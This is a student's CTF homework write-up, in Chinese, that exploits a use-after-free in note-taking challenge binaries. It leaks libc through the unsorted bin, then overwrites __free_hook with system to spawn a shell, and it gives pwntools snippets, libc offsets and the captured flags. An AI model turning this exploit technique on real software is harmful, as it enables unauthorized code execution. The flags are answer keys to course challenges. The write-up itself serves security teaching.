# 2022 Computer Security HW7 Writeup - Pwn

[![hackmd-github-sync-badge](https://hackmd.io/7K8jim6uTFGGWeZsHXnioA/badge)](https://hackmd.io/7K8jim6uTFGGWeZsHXnioA)


* [HW7 github (Writeup and Payload)](https://github.com/fdff87554/Computer-Security-2022/tree/main/Homework-07)


## babynote - LAB

* 本題目設計成一個簡易的 note，分別有
    * `add_note()` - 新增 object
    * `edit_data()` - 修改 object
    * `del_note()` - 刪除 object
    * `show_notes()` - 顯示 object
* 在看程式碼的時候可以發現其中 `del_note()` 只有 `free` 而並沒有把 pointer -> NULL，這就可能造成 UAF (Use-After-Free) 的問題
* 因為知道會有 UAF 的問題，因此目標就是要先嘗試 leak address，因為有了 address 之後就有機會利用 overlapping chunk + UAF 建構任意結構，並且控制執行流程，因為題目環境是 glibc 2.31，所以知道可以寫 hook
* 今天因為要利用 free 時 pointer 沒有 to NULL 的操作來做到 leak address，因此建構了以下結構
    * 第一個區塊為一個 >= 0x420 的 chunk，因為這樣之後在 free 時才會被放置 unsorted bin
    * 接著的第二個區塊則是用來寫 sysbin 用的
    * 而第三個接續區塊則是用來改寫 free_hook 用的
    ```python3=
    # first chunk
    add(0, bytes('0'*8, 'utf-8'))
    edit(0, 0x418, bytes('0', 'utf-8'))

    # second chunk
    add(1, bytes('0'*8, 'utf-8'))
    edit(1, 0x18, bytes('0', 'utf-8'))

    # thrid chunk
    add(2, bytes('0'*8, 'utf-8'))
    ```
* 然後 leak `main_arena`，並得到 libc 的位置
    * 先把 first chunk 利用 delete free 掉，並且讓他被放置到 unsorted bin，接著利用 `show_notes()` 顯示 data 時，其中的內容就已經變成 fd 指向的 address，因此可以得到 leak adr 如下
        > ![](https://i.imgur.com/Dm2hirg.png)
* 藉由 lead address 得到 libc base address，且知道實際上 unsorted bin fd 指向的位置為 `main_arena + 96`，因此 libc_base 應該是 `leak_addr - 96 - 0x1ecb80`
    * `free_hook` 在 libc 的 offset 位置為 `0x1eee48`
    * `system` 在 libc 的 offset 位置為 `0x52290`
* 開始建立 fake chunk 來嘗試 get shell
    * 把剛剛的第二區塊的內容放置為 `/bin/sh` 字串，用來之後執行
    * 把剛剛連著的第三個區塊利用相連的特性 overflow 去修改內容，讓他指向 free_hook
    ```python=
    shell_str = b'/bin/sh\x00'.ljust(0x10, b'0')

    fake_chunk = flat(
        0, 0x21,
        b'00000000', b'00000000',
        free_hook,
    )

    edit(1, 0x38, shell_str + fake_chunk)
    edit(2, 0x8, p64(system))
    ```
* 之後再 delete 第二個區塊就可以 get shell 了，原因是因為 free_hook 中不是空的，因此會把第二個區塊中的 `/bin/sh` 當作函式執行，也就是等於執行了 `system("/bin/sh")`
* 最後取得 flag: `FLAG{babynote^_^_de9187eb6f3cbc1dce465601015f2ca0}`


## babyums (flag1) - HW

* 因為題目看起來跟 babynote 可以說是接近一模一樣，因此且第二題已經提示 flag 是在 `/home/chal`，因此目標一樣是建立在 get shell 上，決定直接看題目中的 `#define FLAG1 "xxxx"`。
* 這題差異的部分在於，User 這個 struct 裡面多了一個 `password[0x11]`，因此只要在建立 fake chunk 的流程中注意這個部分並修改內容跟大小，就可以一樣利用 `delete(1)` getshell，
    ```python=
    shell_str = b'/bin/sh\x00'.ljust(0x10, b'0')

    fake_chunk = flat(
        0, 0x31,
        b'00000000', b'00000000',
        b'00000000', b'00000000',
        free_hook,
    )

    edit(1, 0x48, shell_str + fake_chunk)
    edit(2, 0x8, p64(system))
    ```
* 並且直接 cat babyums.c 拿到 flag: `flag{C8763}` <- 這邊是小寫的 flag

## babyums (flag2) - HW

* 承上一題，因為已經 getshell 了，所以直接把 flag 印出
* flag: `FLAG{crocodile_9d7d8f69be2c2ab84721384d5bda877f}`


---
###### tags: `CyberSec` `Writeup` `2022`

<style>
.navbar-brand::after { content: " × Crazyfire Lee"; }
</style>